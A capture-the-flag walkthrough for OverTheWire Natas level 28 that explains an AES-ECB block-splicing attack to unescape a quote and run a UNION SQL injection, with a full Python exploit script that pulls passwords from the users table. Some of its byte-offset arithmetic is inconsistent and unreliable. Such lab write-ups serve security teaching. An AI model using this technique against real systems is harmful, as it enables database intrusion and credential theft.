> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas28.natas.labs.overthewire.org`                  |
| Username | `natas28`                                                    |
| Password | *found in [Natas Level 26 → 27](natas-level-26-level-27.md)* |

---

## Tools Used

- A web browser
- **Python** — to probe block boundaries, capture ciphertext blocks, and assemble the final payload

---

## Solution

### Step 1 — What the app does

Go to `http://natas28.natas.labs.overthewire.org`. There's a search box. Submit anything and you get redirected to:

```
search.php?query=<base64-encoded-blob>
```

That blob is AES-ECB encrypted SQL. The server decrypts it and runs it. No source is shown.

---

### Step 2 — Figure out what you're working with

**Is it a block cipher?** Flip any character in the `query` parameter. The server responds:

```
Zero padding found instead of PKCS#7 padding
```

So: AES, PKCS#7 padding, decrypted server-side, result executed as SQL.

**Is it ECB?** Submit 32 identical characters (e.g. 32 `A`s). Look at the ciphertext. Bytes 16–31 are identical to bytes 32–47. That's ECB — each 16-byte block is encrypted independently with the same key, no state carried between blocks.

**What does the server prepend?** Before encrypting, the server wraps your input in:

```sql
SELECT jokes FROM jokes WHERE joke LIKE '%<your input>%' LIMIT 1
```

The prefix `SELECT jokes FROM jokes WHERE joke LIKE '%` is exactly 38 bytes. That fills block 1 (bytes 0–15), block 2 (bytes 16–31), and 6 bytes into block 3. Your input starts at **byte 6 of block 3**, so 10 bytes of your input complete block 3.

---

### Step 3 — Why injection seems blocked, and why it isn't

The server escapes `'` to `\'` before encrypting. So if you submit `' UNION ...`, the server turns it into `\' UNION ...` and the SQL parser sees no unescaped quote — injection fails.

But ECB doesn't chain blocks. You can cut out any 16-byte block and replace it with a different one. That's the exploit:

Submit `AAAAAAAAA' UNION ALL SELECT password FROM users;#` (9 `A`s then the payload).

Here's what lands in each block after the server prepends its prefix and escapes the quote:

|Block|Bytes|Content|
|---|---|---|
|1|0–15|`SELECT jokes FROM`|
|2|16–31|`jokes WHERE joke`|
|3|32–47|`LIKE '%AAAAAAAAA\` ← 9 A's + backslash|
|4|48–63|`' UNION ALL SE`|
|5|64–79|`LECT password F`|
|6|80–95|`ROM users;#AA%'`|

The `\` is at the **last byte of block 3**. The `'` is at the **first byte of block 4**. They're in separate blocks.

Now separately encrypt `AAAAAAAAAA` (10 `A`s, no quote). Block 3 of that ciphertext is:

```
 LIKE '%AAAAAAAAAA
```

No backslash. Swap that clean block 3 into the injection ciphertext in place of the `\`-containing block 3. The server decrypts and gets:

```sql
SELECT jokes FROM jokes WHERE joke LIKE '%AAAAAAAAAA' UNION ALL SELECT password FROM users;#...
```

The `'` in block 4 is now unescaped. The `UNION` executes. The `#` comments out the trailing `%' LIMIT 1`.

---

### Step 4 — Python Script

```python
import requests, base64, urllib.parse
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas28", "<password>")
url  = "http://natas28.natas.labs.overthewire.org/index.php"

def get_ciphertext(query):
    r = requests.post(url, auth=auth, data={"query": query}, allow_redirects=False)
    b64 = urllib.parse.unquote(r.headers["Location"].split("query=")[1])
    return base64.b64decode(b64)

prefix_blocks = get_ciphertext("A")[:32]          # blocks 1–2, same in every response
clean_block3  = get_ciphertext("A" * 10)[32:48]   # block 3 with no quote, no backslash
inject_ct     = get_ciphertext("A" * 9 + "' UNION ALL SELECT password FROM users;#")
inject_blocks = inject_ct[48:]                     # blocks 4+ containing the payload

spliced   = prefix_blocks + clean_block3 + inject_blocks
b64_final = base64.b64encode(spliced).decode()

r = requests.get(
    "http://natas28.natas.labs.overthewire.org/search.php/?query=" + urllib.parse.quote(b64_final),
    auth=auth
)
print(r.text)
```

> **NOTE** that the prefix is always constant, it never changes. You could give it anything, in this case *A*s, it'll always be `SELECT jokes FROM jokes WHERE joke LIKE '%`.

```bash
python3 natas28.py
```

The response contains the `password` column from the `users` table — the password for [Natas Level 28 → 29](natas-level-28-level-29.md).

---

## Key Takeaways

- **ECB encrypts each block independently.** No chaining means identical plaintext → identical ciphertext, and blocks can be spliced freely without knowing the key.
- **Escaping before encrypting doesn't prevent injection.** The `\` and `'` from an escaped quote can be split across a block boundary. Discard the `\` block and `'` arrives unescaped. Parameterised queries fix this; encryption does not.
- **Block boundaries are the attack surface.** The prefix length and block size determine where your input lands. Everything else follows from that measurement.
- **CBC would have prevented this.** Each block is XORed with the previous ciphertext before encryption — swapping a block corrupts the next one's decryption, making arbitrary splicing produce garbage.

---